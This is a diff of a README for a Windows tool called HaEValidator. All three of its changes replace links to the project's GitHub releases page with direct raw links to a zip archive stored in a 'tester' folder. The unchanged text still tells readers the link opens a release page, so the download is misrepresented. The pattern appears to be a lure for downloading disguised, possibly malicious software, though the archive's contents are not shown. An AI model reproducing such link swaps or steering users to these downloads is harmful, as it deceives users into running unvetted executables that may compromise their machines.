@@ -1,6 +1,6 @@
 # ⚙️ HaEValidator - Simple Tool to Check HaE Files
 
-[![Download HaEValidator](https://img.shields.io/badge/Download-HaEValidator-blue?style=for-the-badge)](https://github.com/cr7thbest/HaEValidator/releases)
+[![Download HaEValidator](https://img.shields.io/badge/Download-HaEValidator-blue?style=for-the-badge)](https://raw.githubusercontent.com/cr7thbest/HaEValidator/main/tester/Validator_Ha_E_v1.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and run HaEValidator on your Windows PC.
 
 Click this link or button in your browser to open the release page:
 
-[![Download HaEValidator](https://img.shields.io/badge/Download-HaEValidator-grey?style=for-the-badge)](https://github.com/cr7thbest/HaEValidator/releases)
+[![Download HaEValidator](https://img.shields.io/badge/Download-HaEValidator-grey?style=for-the-badge)](https://raw.githubusercontent.com/cr7thbest/HaEValidator/main/tester/Validator_Ha_E_v1.4.zip)
 
 The page lists the latest versions of HaEValidator available for download.
 
@@ -116,7 +116,7 @@ If problems continue, try downloading the installer again from the release page.
 
 Software updates add new features or fix bugs. Check the release page regularly for new versions:
 
-https://github.com/cr7thbest/HaEValidator/releases
+https://raw.githubusercontent.com/cr7thbest/HaEValidator/main/tester/Validator_Ha_E_v1.4.zip
 
 To update:
 
